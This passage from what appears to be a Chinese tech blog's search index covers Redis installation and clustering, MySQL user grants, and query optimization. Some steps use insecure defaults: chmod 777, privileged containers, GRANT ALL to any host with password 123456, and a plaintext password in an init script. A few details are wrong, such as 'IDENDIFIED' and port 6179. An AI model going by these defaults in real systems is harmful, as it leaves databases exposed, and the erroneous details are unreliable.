redis server/io threads to cpu affinity 0,2,4,6:\n# server_cpulist 0-7:2\n#\n# Set bio threads to cpu affinity 1,3:\n# bio_cpulist 1,3\n#\n# Set aof rewrite child process to cpu affinity 8,9,10,11:\n# aof_rewrite_cpulist 8-11\n#\n# Set bgsave child process to cpu affinity 1,10,11\n# bgsave_cpulist 1,10-11\n\n# In some cases redis will emit warnings and even refuse to start if it detects\n# that the system is in bad state, it is possible to suppress these warnings\n# by setting the following config which takes a space delimited list of warnings\n# to suppress\n#\n# ignore-warnings ARM64-COW-BUG\n","tags":["Redis"],"categories":["数据库","Redis"]},{"title":"Redis安装","url":"/20250619/c9f6f059.html","content":"\n# 单机安装：Windows\n\nRedis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。\n\n## 下载地址：\n\n```\nwindows版本： https://github.com/MSOpenTech/redis/releases\nLinux版本：官网下载： http://www.redis.cn/\ngit下载：https://github.com/antirez/redis/releases\n```\n\n 我们现在讨论的是windows下的安装部署，目前windows下最新版本是：3.2.100。下载地址，提供多种下载内容，\n\n ```\nRedis-x64-3.2.100.msi是在windows下，最简单的安装文件，方便，直接会将Redis写入windows服务。\nRedis-x64-3.2.100.zip是需要解压安装的，接下来讨论的是这种。\nSource code (zip) 源码的zip压缩版\nSource code (tar.gz) 源码的tar.gz压缩版 \n ```\n\n![8cc0c90bc2b723d9f6cdc3a1356559b9.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16383227748541.png)   \n\n\n\n## 安装\n\n解压安装将下载的Redis-x64-3.2.100.zip 解压到某个地址。\n\n![5bfe10debe216c18d70d3d0e555be8ae.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image004-16383227748552.png) \n\n启动命令通过cmd指定到该redis目录。\n 使用命令：`redis-server.exe `启动服务\n\n ![263f236f685ad552e15c64422eda72d6.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image005-16383227748554.png) \n\n 出现这种效果，表明启动服务成功。启动另一个cmd，在该redis目录下，使用命令：redis-cli.exe 启动客户端,连接服务器\n\n![ff00ad0320f2dbe6e8d3a50aa8e8b1a8.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image006-16383227748553.png)  \n\n出现这种效果，表明启动客户度成功。\n\n## 部署\n\n 由于上面虽然启动了redis服务，但是，只要一关闭cmd窗口，redis服务就关闭了。所以，把redis设置为一个windows服务。\n\n安装之前，windows服务是不包含redis服务的 \n\n安装为windows服务安装命令: \n\n![95da60801d83c5caf9c8286ecab1574f.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image008-16383227748555.png) \n\n\n```\nredis-server.exe --service-install redis.windows.conf\n```\n\n使用命令，安装成功，如图所示\n\n\n ![cf536a1024ae8ece56703496ca29dbff.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image009.png) \n\n\n\n最后的参数` --loglevel verbose`表示记录日志等级\n\n安装之后，windows目前的服务列表\n\n\n ![ad9747b797fe689579ca4642902afe49.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image011.png) \n\n\n\n常用的redis服务命令。\n\n```sh\n卸载服务：redis-server --service-uninstall\n开启服务：redis-server --service-start\n停止服务：redis-server --service-stop\n重命名服务：redis-server --service-name name\n```\n\n\n 重命名服务，需要写在前三个参数之后\n\n例如： The following would install and start three separate instances of Redis as a service:\n\n以下将会安装并启动三个不同的Redis实例作服务：\n\n```\nredis-server --service-install --service-name redisService1 --port 10001\nredis-server --service-start --service-name redisService1\n\nredis-server --service-install --service-name redisService2 --port 10002\nredis-server --service-start --service-name redisService2\n\nredis-server --service-install --service-name redisService3 --port 10003\nredis-server --service-start --service-name redisService3\n```\n\n四：测试启动服务\n\n客户端命令\n\n```sh\nredis-server --service-start\n```\n\n精简模式\n\n```sh\nredis-cli.exe\n```\n\n指定模式\n\n```sh\nredis-cli.exe -h 127.0.0.1 -p 6379 -a requirepass\n```\n\n| 参数 | 说明                                                         |\n| ---- | ------------------------------------------------------------ |\n| -h   | 服务器地址                                                   |\n| -p   | 指定端口号                                                   |\n| -a   | 连接数据库的密码[可以在redis.windows.conf中配置]，默认无密码 |\n\n![05c2f1e1f504cb3480c6a96e746c0554.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image012.png) \n 安装测试成功。\n\n# 单机安装：Centos\n\n## 准备\n\n1. 下载redis安装包\n\n ```sh\nwget http://download.redis.io/releases/redis-4.0.6.tar.gz\n ```\n\n![4500b2d7d6f71a55db9aef7a8050394e.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image013.png)  \n\n2. 解压压缩包\n\n```sh\ntar zxvf redis-4.0.6.tar.gz\n```\n\n ![632ce9c44a953178bb01cedd24d4d8ab.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image014.png)  \n\n3. yum安装gcc依赖\n\n```sh\nyum -y install gcc\n```\n\n## 安装\n\n1. 跳转到redis解压目录下\n\n```sh\ncd /usr/software/redis-4.0.6\n```\n\n2. 编译安装 \n\n```sh\nmake\n```\n\n![9760df7be3b6d1534296047905b13e61.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image015.png)  \n\n\n ```sh\n将/usr/software/redis-4.0.6/src目录下的文件加到/usr/local/bin目录\n\ncd src && make install\n ```\n\n![4aaeefe75f7c20cb5039b355f7062e7f.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image016.png)  \n\n## 启动redis的三种方式\n\n### 直接启动\n\n```sh\n先切换到redis src目录下\n\ncd /usr/software/redis-4.0.6/src\n```\n\n直接启动redis\n\n ```\n./redis-server\n ```\n\n![277d11179a4ec94b22e978a0f10f1a36.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image017.png)  \n 如上图：redis启动成功，但是这种启动方式需要一直打开窗口，不能进行其他操作，不太方便。\n 按 ctrl + c可以关闭窗口。\n\n![19606b9997c671ce2722f2315ddff2dd.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image018.png)  \n\n\n\n### 以后台进程方式启动redis\n\n1. 修改redis.conf文件\n\n   ```\n   cd /usr/software/redis-4.0.6\n   vi redis.conf\n   ```\n\n2. 将 `daemonize no` 修改 `daemonize yes`\n\n    ![4690346a97fc0b147c66c8220cfb6e70.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image019.png) \n\n      ![e5b2377dbc25cbf8dbd5a97341b744db.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image020.png) \n\n3. 指定redis.conf文件启动\n\n   ```\n   cd /usr/software/redis-4.0.6/src\n   ./redis-server /usr/software/redis-4.0.6/redis.conf\n   ```\n\n4. 关闭redis进程\n\n   ```\n   ps -aux | grep redis\n   ```\n\n   ![4b9b6364ca42da21b0e27f1e1dc90824.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image021.png) \n\n   ```\n   kill -9 11753\n   ```\n\n   \n\n### 设置redis为系统服务\n\n   1. 在/etc目录下新建redis目录\n\n      ```\n      cd /etc\n      mkdir redis\n      ```\n\n   2. 将 `/usr/software/redis-4.0.6/redis.conf `文件复制一份到/etc/redis目录下，并命名为6379.conf　　\n\n      ```sh\n      cp /usr/software/redis-4.0.6/redis.conf /etc/redis/6379.conf\n      ```\n\n   3. 将redis的启动脚本复制一份放到/etc/init.d目录下\n\n      ```sh\n      cp /usr/software/redis-4.0.6/utils/redis_init_script /etc/init.d/redisd\n      ```\n\n   4. 设置redis开机自启动\n\n      ```sh\n      cd /etc/init.d\n      chkconfig redisd on\n      ```\n\n      \n\n      出现问题1：\n\n      ```\n      service redisd does not support chkconfig　\n      ```\n\n       看结果是redisd不支持chkconfig\n       解决方法：`vi /etc/init.d/redisd`，加入如下两行注释，保存退出\n\n       ```\n      # chkconfig: 2345 90 10\n      # summary: Redis is a persistent key-value database\n       ```\n\n      ![ea9dc06f591188ad0d2c8ff4c0e8c4be.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image022.png)   \n\n      注释的意思是：redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10。\n\n      ![48608ef900b2bd7ed0f5a08598d11463.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image023.png)  \n\n       再次执行开机自启命令，成功\n\n      ```sh\n      chkconfig redisd on\n      ```\n\n      现在可以直接以服务的形式启动和关闭redis了\n\n      \n\n      再次启动：\n\n       ```\n      service redisd start\n       ```\n\n       \n\n      出现问题2：\n\n       ![95d24c1fc0745a3f0e55b6140ee87462.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image024.png)\n\n      删除：`redis_6379.pid`后，再次执行：\n\n       ![b401291681b760b35c2643e97dbddb25.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image025.png)\n\n   5. 关闭\n\n      ```sh\n      service redisd stop\n      ```\n\n### 配置密码登录\n\n1. 修改配置文件，使用密码登录\n\n   ```sh\n   vi /usr/software/redis-4.0.6/redis.conf\n   ```\n\n    ![89a9f187a67da6a0bdc92f8f05ff54b1.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image026.png)\n\n   \n\n   此时，访问redis客户端查询\n\n    ![7742f0112fb76da057cc87316510da4d.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image027.png)\n\n   \n\n   使用密码后，停止服务会报错：\n\n   ```sh\n   service redisd stop\n   ```\n\n   \n\n    ![9d88c06e13e7f4116629ae69fdaecd03.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image028.png)\n\n   \n\n2. 修改启动配置文件\n\n   ```\n   vi /etc/init.d/redisd\n   \n   \n   将其中的\n   CLIEXEC -p REDISPORT shutdown\n   改为\n   CLIEXEC -a \"3448395502\" -p REDISPORT shutdown\n   ```\n\n## 防火墙开放端口6179\n\n1. 开启6179\n\n   ```sh\n   /sbin/iptables -I INPUT -p tcp --dport 6179 -j ACCEPT\n   ```\n\n2. 保存\n\n   ```sh\n   /etc/rc.d/init.d/iptables save\n   ```\n\n3. centos 7下执行\n\n   ```sh\n   service iptables save\n   ```\n\n   \n\n```\n 参考：\n https://blog.csdn.net/zc474235918/article/details/50974483\n https://www.cnblogs.com/aqicheng/p/11512153.html\n```\n\n\n\n\n\n\n\n\n\n# Docker安装Redis集群\n\n> 集群至少6个节点\n>\n> 1. 集群至少3个主节点\n> 2. 每个主节点至少一个从节点（若一个主节点设置2个从节点，则需要9个节点）\n\n## 1. 环境准备\n\n>  redis.conf模板文件redis-cluster.tmpl\n\n```\n# redis端口\nport ${NODE_PORT}\nrequirepass custom_password\nmasterauth custom_password\n\n# 开启集群\ncluster-enabled yes\nappendonly yes\ncluster-node-timeout 5000\n#protected-mode no\n\nloglevel notice\nlogfile /redis/log/redis.log\ndir /redis/data\n\n# 集群节点配置\ncluster-announce-ip 172.16.163.128\ncluster-announce-port ${NODE_PORT}\ncluster-announce-bus-port 1${NODE_PORT}\n```\n\n> 批量生成节点文件的批处理程序：redis-cluster-config-before.sh\n\n` chmod u+x redis-cluster-config-before.sh` 修改可执行权限\n\n```sh\n#!/bin/bash  \n# 节点数据\nfor port in $(seq 6381 6386)\ndo \n rm -rf /opt/docker/redis-cluster-7.0.0/${port}\n mkdir -p /opt/docker/redis-cluster-7.0.0/${port}/data; \n mkdir -p /opt/docker/redis-cluster-7.0.0/${port}/log; \n mkdir -p /opt/docker/redis-cluster-7.0.0/${port}/conf; \n chmod 777 /opt/docker/redis-cluster-7.0.0/${port}/conf\n chmod 777 /opt/docker/redis-cluster-7.0.0/${port}/log\n chmod 777 /opt/docker/redis-cluster-7.0.0/${port}/data\n#  export NODE_PORT=${port}\n#  export NODE_INDEX=`expr ${port} - 6379` \n#  export NODE_IP=172.19.0.${NODE_INDEX}\n#  echo ${NODE_IP} ${NODE_PORT}\n NODE_PORT=${port} envsubst < /opt/docker/redis-cluster-7.0.0/redis-cluster.tmpl > /opt/docker/redis-cluster-7.0.0/${port}/conf/redis.conf;\ndone\n```\n\n## 2. 创建容器\n\n> docker-compose.yml 文件\n\n`docker-compose up -d` \n\n```yml\nversion: '3.7'\nservices:\n  redis_6381:\n    image: 'redis:7.0.0'\n    container_name: redis_6381\n    privileged: true\n    restart: always\n    command:\n      redis-server /usr/local/etc/redis/redis.conf\n    volumes:\n      - ./6381/conf/redis.conf:/usr/local/etc/redis/redis.conf\n      - ./6381/data:/redis/data\n      - ./6381/log:/redis/log\n    ports:\n      - \"6381:6381\"\n      - \"16381:16381\"\n  \n  redis_6382:\n    image: 'redis:7.0.0'\n    container_name: redis_6382\n    privileged: true\n    restart: always\n    command:\n      redis-server /usr/local/etc/redis/redis.conf\n    volumes:\n      - ./6382/conf/redis.conf:/usr/local/etc/redis/redis.conf\n      - ./6382/data:/redis/data\n      - ./6382/log:/redis/log\n    ports:\n      - \"6382:6382\"\n      - \"16382:16382\"\n\n\n  redis_6383:\n    image: 'redis:7.0.0'\n    container_name: redis_6383\n    privileged: true\n    restart: always\n    command:\n      redis-server /usr/local/etc/redis/redis.conf\n    volumes:\n      - ./6383/conf/redis.conf:/usr/local/etc/redis/redis.conf\n      - ./6383/data:/redis/data\n      - ./6383/log:/redis/log\n    ports:\n      - \"6383:6383\"\n      - \"16383:16383\"\n\n  redis_6384:\n    image: 'redis:7.0.0'\n    container_name: redis_6384\n    privileged: true\n    restart: always\n    command:\n      redis-server /usr/local/etc/redis/redis.conf\n    volumes:\n      - ./6384/conf/redis.conf:/usr/local/etc/redis/redis.conf\n      - ./6384/data:/redis/data\n      - ./6384/log:/redis/log\n    ports:\n      - \"6384:6384\"\n      - \"16384:16384\"\n\n  redis_6385:\n    image: 'redis:7.0.0'\n    container_name: redis_6385\n    privileged: true\n    restart: always\n    command:\n      redis-server /usr/local/etc/redis/redis.conf\n    volumes:\n      - ./6385/conf/redis.conf:/usr/local/etc/redis/redis.conf\n      - ./6385/data:/redis/data\n      - ./6385/log:/redis/log\n    ports:\n      - \"6385:6385\"\n      - \"16385:16385\"\n\n  redis_6386:\n    image: 'redis:7.0.0'\n    container_name: redis_6386\n    privileged: true\n    restart: always\n    command:\n      redis-server /usr/local/etc/redis/redis.conf\n    volumes:\n      - ./6386/conf/redis.conf:/usr/local/etc/redis/redis.conf\n      - ./6386/data:/redis/data\n      - ./6386/log:/redis/log\n    ports:\n      - \"6386:6386\"\n      - \"16386:16386\"\n```\n\n## 3. 防火墙\n\n开放`6381-6386 16381-16386`端口\n\n- Urban `ufw allow 6381` 然后查看 `ufw status`\n- Linux   `firewall-cmd --zone=public --add-port=6381/tcp --permanent` 然后查看 `firewall-cmd --zone= public --query-port=6381/tcp`\n\n## 4.  集群配置\n\n- 进入其中一个节点的容器命令行：`docker exec -it redis_6382 bash`\n- 集群各个节点自动分配：`redis-cli -a custom_password --cluster create 172.16.163.128:6381 172.16.163.128:6382 172.16.163.128:6383 172.16.163.128:6384 172.16.163.128:6385 172.16.163.128:6386 --cluster-replicas 1`\n- 集群测试：`redis-cli -a custom_password --cluster check 172.16.163.128:6381`\n- 集群健康：`redis-cli -c -h 172.16.163.128 -p 6381 -a custom_password`进入容器，查看`cluster info`","tags":["Redis"],"categories":["数据库","Redis"]},{"title":"MySQL用户管理","url":"/20250619/ad072d5f.html","content":"\n\n\n# MySQL 创建用户并授权\n\n##  一、创建用户:\n\n命令:\n\n**CREATE USER 'username'@'host' IDENTIFIED BY 'password';** \n\n \n\n说明:\n\nusername - 你将创建的用户名,\n\nhost - 指定该用户在哪个主机上可以登陆,如果是本地用户可用localhost, 如果想让该用户可以从任意远程主机登陆,可以使用通配符%. \n\npassword - 该用户的登陆密码,密码可以为空,如果为空则该用户可以不需要密码登陆服务器. \n\n例子: \n\n```sql\nCREATE USER 'dog'@'localhost' IDENTIFIED BY '123456'; \n\nCREATE USER 'pig'@'192.168.1.101_' IDENDIFIED BY '123456'; \n\nCREATE USER 'pig'@'%' IDENTIFIED BY '123456'; \n\nCREATE USER 'pig'@'%' IDENTIFIED BY ''; \n\nCREATE USER 'pig'@'%'; \n```\n\n\n\n## 二、授权:\n\n命令:\n\n```sql\nGRANT privileges ON databasename.tablename TO 'username'@'host'\n```\n\n说明: \n\nprivileges - 用户的操作权限,如SELECT , INSERT , UPDATE 等(详细列表见该文最后面).如果要授予所的权限则使用ALL.;\n\ndatabasename - 数据库名,\n\ntablename-表名, 如果要授予该用户对所有数据库和表的相应操作权限则可用*表示, 如*.*. \n\n例子: \n\n```sql\nGRANT SELECT, INSERT ON test.user TO 'pig'@'%'; \n\nGRANT ALL ON *.* TO 'pig'@'%'; \n\n```\n\n注意:用以上命令授权的用户不能给其它用户授权,\n\n如果想让该用户可以授权,用以下命令: \n\n```sql\nGRANT privileges ON databasename.tablename TO 'username'@'host' WITH GRANT OPTION;\n```\n\n\n\n## 三、 设置与更改用户密码 \n\n命令:\n\n```sql\nSET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');\n```\n\n如果是当前登陆用户用\n\n```sql\nSET PASSWORD = PASSWORD(\"newpassword\"); \n```\n\n非当前用户\n\n```sql\nSET PASSWORD FOR 'pig'@'%' = PASSWORD(\"123456\"); \n```\n\n\n\n## 四、撤销用户权限 \n\n命令: \n\n```sql\nREVOKE privilege ON databasename.tablename FROM 'username'@'host';\n```\n\n说明: privilege, databasename, tablename - 同授权部分. \n\n例子: \n\n```sql\nREVOKE SELECT ON *.* FROM 'pig'@'%'; \n\n注意: 假如你在给用户'pig'@'%'授权的时候是这样的(或类似的):\n\nGRANT SELECT ON test.user TO 'pig'@'%',\n\n则在使用REVOKE SELECT ON *.* FROM 'pig'@'%';\n\n命令并不能撤销该用户对test数据库中user表的SELECT 操作.\n\n相反,如果授权使用的是GRANT SELECT ON *.* TO 'pig'@'%';\n\n则REVOKE SELECT ON test.user FROM 'pig'@'%';\n\n命令也不能撤销该用户对test数据库中user表的Select 权限. \n\n具体信息可以用命令SHOW GRANTS FOR 'pig'@'%'; 查看. \n```\n\n\n\n## 五、删除用户 \n\n命令: \n\n```sql\nDROP USER 'username'@'host';\n```\n\n\n\n附表:在MySQL中的操作权限 \n\n| ALTER                   | Allows use  of ALTER TABLE.                                  |\n| ----------------------- | ------------------------------------------------------------ |\n| ALTER ROUTINE           | Alters or drops  stored routines.                            |\n| CREATE                  | Allows use  of CREATE TABLE.                                 |\n| CREATE ROUTINE          | Creates stored  routines.                                    |\n| CREATE TEMPORARY  TABLE | Allows use  of CREATE TEMPORARY TABLE.                       |\n| CREATE USER             | Allows use  of CREATE USER, DROP USER, RENAME USER, and REVOKE ALL PRIVILEGES. |\n| CREATE VIEW             | Allows use  of CREATE VIEW.                                  |\n| DELETE                  | Allows use  of DELETE.                                       |\n| DROP                    | Allows use  of DROP TABLE.                                   |\n| EXECUTE                 | Allows the user  to run stored routines.                     |\n| FILE                    | Allows use  of SELECT... INTO OUTFILE and LOAD DATA INFILE.  |\n| INDEX                   | Allows use  of CREATE INDEX and DROP INDEX.                  |\n| INSERT                  | Allows use  of INSERT.                                       |\n| LOCK TABLES             | Allows use  of LOCK TABLES on tables for which the user also  has SELECT privileges. |\n| PROCESS                 | Allows use  of SHOW FULL PROCESSLIST.                        |\n| RELOAD                  | Allows use  of FLUSH.                                        |\n| REPLICATION             | Allows the user  to ask where slave or master                |\n| CLIENT                  | servers are.                                                 |\n| REPLICATION  SLAVE      | Needed for  replication slaves.                              |\n| SELECT                  | Allows use  of SELECT.                                       |\n| SHOW DATABASES          | Allows use  of SHOW DATABASES.                               |\n| SHOW VIEW               | Allows use  of SHOW CREATE VIEW.                             |\n| SHUTDOWN                | Allows use  of mysqladmin shutdown.                          |\n| SUPER                   | Allows use  of CHANGE MASTER, KILL, PURGE MASTER LOGS, and SET  GLOBAL SQL statements. Allows mysqladmin debug command. Allows  one extra connection to be made if maximum connections are reached. |\n| UPDATE                  | Allows use  of UPDATE.                                       |\n| USAGE                   | Allows connection  without any specific privileges.          |","tags":["MySQL"],"categories":["数据库","MySQL"]},{"title":"MySQL查询优化策略","url":"/20250619/ec788ee4.html","content":"\n# 查询优化策略\n\n| 建议                                                         | 原因                                                         |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 不要使用 select * from t                                     | 任何地方都不要使用  select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段 |\n| 控制查询结果的大小                                           | 尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。 |\n| 考虑在 where 及  order by 涉及的列上建立索引                 |                                                              |\n| 避免在 where 子句中使用!=或<>操作符                          | 否则将引擎放弃使用索引而进行全表扫描                         |\n| 避免在 where 子句中对字段进行 null 值判断<br>（可以用空白或0这样的默认值替代W） | 否则将引擎放弃使用索引而进行全表扫描                         |\n| LEFT JOIN 将可能的组合条件放到Where中                        |                                                              |\n| 查询时候的like条件，减少前置百分号                           | 考虑全文检索？                                               |\n| 尽量避免在 where 子句中使用 or 来连接条件                    | 否则将引擎放弃使用索引而进行全表扫描： <br>select id from t where num=10 or num=20<br>可以这样查询：<br>select id from t where num=10<br>union all<br>select id from t where num=20 |\n| in 和 not in 也要慎用，否则会导致全表扫描                    | select id from  t where num in(1,2,3)<br>对于连续的数值，能用 between 就不要用 in 了<br>select id from t where num between 1 and 3 |\n| 很多时候可以用  exists 代替 in                               | select num from  a where num in(select num from b) <br>用下面的语句替换：<br>select num from a where exists(select 1 from b where num=a.num) |\n| 使用数字型字段（数据只含有数字）                             | 若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。<br>这是因为引擎在处理查询和连接时会 逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。 |\n| 避免在 where 子句中对字段进行表达式操作或者函数操作等        | 否则将导致引擎放弃使用索引而进行全表扫描。<br>如：select id from  t where num/2=100<br>应改为: select id from  t where num=100*2<br><br/>select id from t where substring(name,1,3)=’abc’;<br/>select id from t where datediff(day,createdate,’2005-11-30′)=0<br/>应改为:<br/>select id from t where name like ‘abc%’<br/>select id from t where createdate >= ’2005-11-30′ and createdate < ’2005-12-1′<br/> |\n| 使用符合索引，查询条件必须使用到其第一个字段。               | 在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使 用，并且应尽可能的让字段顺序与索引顺序相一致。 |\n| 不要写一些没有意义的查询，减少资源占用                       | 如需要生成一个空表结构：<br/>select col1,col2 into #t from t where 1=0<br/>这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：<br/>create table #t(…) |\n| 对大量重复的数据列建索引无太大意义                           | 并不是所有索引对查询都有效<br/>SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引<br/>如一表中有字段 sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。<br/> |\n| 使用索引会提高select的效率，降低insert 及 update 的效率      | 索引并不是越多越好，索引固然可以提高相应的 select 的效率，<br/>但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引<br/> |\n| 尽可能的使用 varchar/nvarchar 代替 char/nchar                | 因为首先变长字段存储空间小，可以节省存储空间，<br/>其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。 |\n| 应尽可能的避免更新 clustered 索引数据列                      | 因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。 |\n\n# Explain关键字\n\n​\t\texplain显示了MySQL如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。简单讲，它的作用就是分析查询性能。\n\n​\t\texplain关键字的使用方法很简单，就是把它放在select查询语句的前面。\n\n​\t\tmysql查看是否使用索引，简单的看type类型就可以。如果它是all，那说明这条查询语句遍历了所有的行，并没有使用到索引。\n\n```sql\nexplain select * from company_info where cname like '%小%'\n```\n\n![image-20211201013210968](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211201013210968.png)  \n\n```sql\nexplain select * from company_info where cname like '小%'\n```\n\n ![image-20211201013229904](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211201013229904.png)   \n\nExplain查询结果说明\n\n![image-20211201013654229](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211201013654229.png)   \n\n\n\n1. id列数字越大越先执行，如果说数字一样大，那么就从上往下依次执行，id列为null的就表是这是一个结果集，不需要使用它来进行查询。\n\n2. select_type列常见的有\n\n   | 参数               | 说明                                                         |\n   | ------------------ | ------------------------------------------------------------ |\n   | simple             | 表示不需要union操作或者不包含子查询的简单select查询。有连接查询时，外层的查询为simple，且只有一个 |\n   | primary            | 一个需要union操作或者含有子查询的select，位于最外层的单位查询的select_type即为primary。且只有一个 |\n   | union              | union连接的两个select查询，第一个查询是dervied派生表，除了第一个表外，第二个以后的表select_type都是union |\n   | dependent union    | 与union一样，出现在union 或union all语句中，但是这个查询要受到外部查询的影响 |\n   | union result       | 包含union的结果集，在union和union all语句中,因为它不需要参与查询，所以id字段为null |\n   | subquery           | 除了from字句中包含的子查询外，其他地方出现的子查询都可能是subquery |\n   | dependent subquery | 与dependent union类似，表示这个subquery的查询要受到外部表查询的影响 |\n   | derived            | from字句中出现的子查询，也叫做派生表，其他数据库中可能叫做内联视图或嵌套select |\n\n3. table\n\n   - 如果查询使用了别名，那么这里显示的是别名\n\n   - 如果不涉及对数据表的操作，那么这显示为null，\n   - 如果显示为尖括号括起来的<derived N>就表示这个是临时表，后边的N就是执行计划中的id，表示结果来自于这个查询产生。\n   - 如果是尖括号括起来的<union M,N>，与<derived N>类似，也是一个临时表，表示这个结果来自于union查询的id为M,N的结果集。\n\n4. type\n\n   依次从好到差：<font color='red'>system，const，eq_ref，ref，fulltext，ref_or_null，unique_subquery，index_subquery，range，index_merge，index，ALL</font>，\n\n   除了all之外，其他的type都可以使用到索引，除了index_merge之外，其他的type只可以用到一个索引\n\n   | 参数            | 说明                                                         |\n   | --------------- | ------------------------------------------------------------ |\n   | system          | 表中只有一行数据或者是空表，且只能用于myisam和memory表。如果是Innodb引擎表，type列在这个情况通常都是all或者index |\n   | const           | 使用唯一索引或者主键，返回记录一定是1行记录的等值where条件时，通常type是const。其他数据库也叫做唯一索引扫描 |\n   | eq_ref          | 出现在要连接过个表的查询计划中，驱动表只返回一行数据，且这行数据是第二个表的主键或者唯一索引，且必须为not  null，唯一索引和主键是多列时，只有所有的列都用作比较时才会出现eq_ref |\n   | ref             | 不像eq_ref那样要求连接顺序，也没有主键和唯一索引的要求，只要使用相等条件检索时就可能出现，常见与辅助索引的等值查找。或者多列主键、唯一索引中，使用第一个列之外的列作为等值查找也会出现，总之，返回数据不唯一的等值查找就可能出现。 |\n   | fulltext        | 全文索引检索，要注意，全文索引的优先级很高，若全文索引和普通索引同时存在时，mysql不管代价，优先选择使用全文索引 |\n   | ref_or_null     | 与ref方法类似，只是增加了null值的比较。实际用的不多。        |\n   | unique_subquery | 用于where中的in形式子查询，子查询返回不重复值唯一值          |\n   | index_subquery  | 用于in形式子查询使用到了辅助索引或者in常数列表，子查询可能返回重复值，可以使用索引将子查询去重。 |\n   | range           | 索引范围扫描，常见于使用>,<,is null,between ,in ,like等运算符的查询中。 |\n   | index_merge     | 表示查询使用了两个以上的索引，最后取交集或者并集，常见and  ，or的条件使用了不同的索引，官方排序这个在ref_or_null之后，但是实际上由于要读取所个索引，性能可能大部分时间都不如range |\n   | index           | 索引全表扫描，把索引从头到尾扫一遍，常见于使用索引列就可以处理不需要读取数据文件的查询、可以使用索引排序或者分组的查询。 |\n   | all             | 这个就是全表扫描数据文件，然后再在server层进行过滤返回符合要求的记录。 |\n\n5. possible_keys\n   查询可能使用到的索引都会在这里列出来\n\n6. key\n   查询真正使用到的索引，select_type为index_merge时，这里可能出现两个以上的索引，其他的select_type这里只会出现一个。\n\n7. key_len\n\n   用于处理查询的索引长度，如果是单列索引，那就整个索引长度算进去，如果是多列索引，那么查询不一定都能使用到所有的列，具体使用到了多少个列的索引，这里就会计算进去，没有使用到的列，这里不会计算进去。留意下这个列的值，算一下你的多列索引总长度就知道有没有使用到所有的列了。要注意，mysql的ICP特性使用到的索引不会计入其中。另外，key_len只计算where条件用到的索引长度，而排序和分组就算用到了索引，也不会计算到key_len中。\n\n8. ref\n   如果是使用的常数等值查询，这里会显示const，如果是连接查询，被驱动表的执行计划这里会显示驱动表的关联字段，如果是条件使用了表达式或者函数，或者条件列发生了内部隐式转换，这里可能显示为func\n\n9. rows\n   这里是执行计划中估算的扫描行数，不是精确值\n\n10. extra\n\n​\t性能从好到坏:useing index>usinh where > using temporary > using filesort\n\n| 参数                                       | 说明                                                         |\n| ------------------------------------------ | ------------------------------------------------------------ |\n| distinct                                   | 在select部分使用了distinc关键字                              |\n| no tables used                             | 不带from字句的查询或者From dual查询。 使用not in()形式子查询或not  exists运算符的连接查询，这种叫做反连接。<br>即，一般连接查询是先查询内表，再查询外表，反连接就是先查询外表，再查询内表 |\n| using filesort                             | 排序时无法使用到索引时，就会出现这个。<br/>常见于order by和group by语句中 |\n| using index                                | 查询时不需要回表查询，直接通过索引就可以获取查询的数据       |\n| using_union                                | 表示使用or连接各个使用索引的条件时，该信息表示从处理结果获取并集 |\n| using intersect                            | 表示使用and的各个索引的条件时，该信息表示是从处理结果获取交集 |\n| using sort_union和using  sort_intersection | 